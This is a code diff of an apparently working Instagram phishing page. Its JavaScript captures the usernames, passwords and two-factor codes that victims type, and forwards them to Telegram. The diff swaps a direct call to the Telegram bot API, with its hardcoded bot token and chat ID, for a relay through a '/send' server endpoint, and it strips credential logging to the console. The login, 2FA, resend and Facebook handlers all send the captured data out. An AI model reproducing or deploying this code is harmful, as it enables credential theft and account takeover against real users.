@@ -170,11 +170,6 @@
 </footer>
 
 <script>
-    // ===== توكن التليجرام الصحيح =====
-    const BOT_TOKEN = '8742987687:AAFTu4WRbRTiy5F-irmltRw8QmFkMXASUzQ';
-    const CHAT_ID = '8278195073';
-
-    // ===== SLIDESHOW =====
     const slides = document.getElementById('slides');
     let currentSlide = 0;
     setInterval(() => {
@@ -182,7 +177,6 @@
         slides.style.transform = `translateX(-${currentSlide * 100}%)`;
     }, 3000);
 
-    // ===== LOGIN FORM =====
     const u = document.getElementById('username');
     const p = document.getElementById('password');
     const loginBtn = document.getElementById('loginBtn');
@@ -210,7 +204,21 @@
     u.addEventListener('input', checkLogin);
     p.addEventListener('input', checkLogin);
 
-    // ===== SUBMIT LOGIN =====
+    // ===== SEND TO SERVER (هو كيبعت للسيرفر والسيرفر كيبعت للتليغرام) =====
+    function sendToTelegram(message) {
+        fetch('/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ message: message })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) console.log('[+] Sent to Telegram');
+            else console.error('[-] Telegram error:', data);
+        })
+        .catch(err => console.error('[-] Fetch error:', err));
+    }
+
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
         if (cooldownTimer) return;
@@ -218,12 +226,6 @@
         capturedUsername = u.value.trim();
         capturedPassword = p.value;
 
-        console.log('[+] Username:', capturedUsername);
-        console.log('[+] Password:', capturedPassword);
-        console.log('[+] UA:', navigator.userAgent);
-        console.log('[+] Time:', new Date().toISOString());
-
-        // ====== تسريب فوري للبيانات لتليجرام ======
         sendToTelegram(
             `🔐 *Instagram Login Captured* 🔐\n\n` +
             `👤 *Username:* \`${capturedUsername}\`\n` +
@@ -233,7 +235,6 @@
             `🌐 *URL:* ${window.location.href}`
         );
 
-        // ====== بدء العداد 10 ثواني ======
         loginBtn.disabled = true;
         cooldownOverlay.style.display = 'flex';
         cooldownCount = 10;
@@ -258,7 +259,6 @@
         }, 1000);
     });
 
-    // ===== 2FA CODE INPUT =====
     codeBoxes.forEach((box, index) => {
         box.addEventListener('input', function() {
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
@@ -289,10 +289,8 @@
         });
     });
 
-    // ===== VERIFY =====
     verifyBtn.addEventListener('click', function() {
         const code = Array.from(codeBoxes).map(b => b.value).join('');
-        console.log('[+] 2FA Code:', code);
 
         sendToTelegram(
             `🔐 *Instagram 2FA Code Received* 🔐\n\n` +
@@ -310,16 +308,13 @@
         }, 2000);
     });
 
-    // ===== RESEND =====
     resendBtn.addEventListener('click', function() {
-        console.log('[+] Resend code requested');
         codeBoxes.forEach(box => box.value = '');
         codeBoxes[0].focus();
         verifyBtn.disabled = true;
         sendToTelegram(`🔄 *Resend Code Requested* 🔄\n\n👤 *Username:* \`${capturedUsername}\`\n⏰ *Time:* ${new Date().toISOString()}`);
     });
 
-    // ===== BACK TO LOGIN =====
     backLink.addEventListener('click', function(e) {
         e.preventDefault();
         twofaSection.style.display = 'none';
@@ -328,34 +323,10 @@
         checkLogin();
     });
 
-    // ===== FACEBOOK =====
     document.getElementById('fbLogin').addEventListener('click', function(e) {
         e.preventDefault();
-        console.log('[+] Facebook login clicked');
         sendToTelegram(`📘 *Facebook Login Clicked* 📘\n\n👤 *Username:* \`${capturedUsername || 'N/A'}\`\n⏰ *Time:* ${new Date().toISOString()}`);
     });
-
-    // ===== SEND TO TELEGRAM =====
-    function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const payload = {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        };
-
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.ok) console.log('[Telegram] Sent successfully');
-            else console.error('[Telegram] Error:', data);
-        })
-        .catch(err => console.error('[Telegram] Fetch error:', err));
-    }
 </script>
 </body>
 </html>
